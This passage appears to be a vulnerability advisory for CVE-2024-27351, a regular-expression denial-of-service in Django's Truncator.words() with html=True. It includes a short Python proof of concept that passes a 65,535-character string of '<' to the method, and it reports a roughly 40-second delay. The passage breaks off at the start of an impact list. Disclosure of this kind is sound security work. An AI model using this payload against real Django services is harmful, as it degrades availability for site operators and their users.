## Details
# TL;DR

**CVE-2024-27351**: Potential regular expression denial-of-service in `django.utils.text.Truncator.words()`

# Details:

`django.utils.text.Truncator.words()` method (with `html=True`) and `truncatewords_html` template filter were subject to a potential regular expression denial-of-service attack using a suitably crafted string (follow up to CVE-2019-14232 and CVE-2023-43665).

- The `Truncator` class truncates text based on word count.
- When the `html` flag is set, the internal `_truncate_html()` method is used.
- This method relies on regular expressions stored in variables (`re_chars` and `re_words`) to perform the truncation.
- These regular expressions are vulnerable to ReDoS attacks, which can cause significant performance degradation and denial-of-service.

**PoC:**

```python
#!/usr/bin/env python3
from django.utils.text import Truncator
import time


MAX_LENGTH = 65535

payload = '<' * MAX_LENGTH
print('[INFO] %d bytes of payload' % len(payload))

start_time = time.time()
Truncator(payload).words(3, truncate='...', html=True) # BOOM!
end_time = time.time()

print('[INFO] Truncator().words() took %lf seconds' % (end_time - start_time))
```

The impact of this vulnerability may vary depending on the computing environment. In my tests using an AMD Ryzen 7 3700X with 32GB RAM, I observed a notable delay of approximately 40 seconds.

## Impact

An attacker could exploit this vulnerability to:
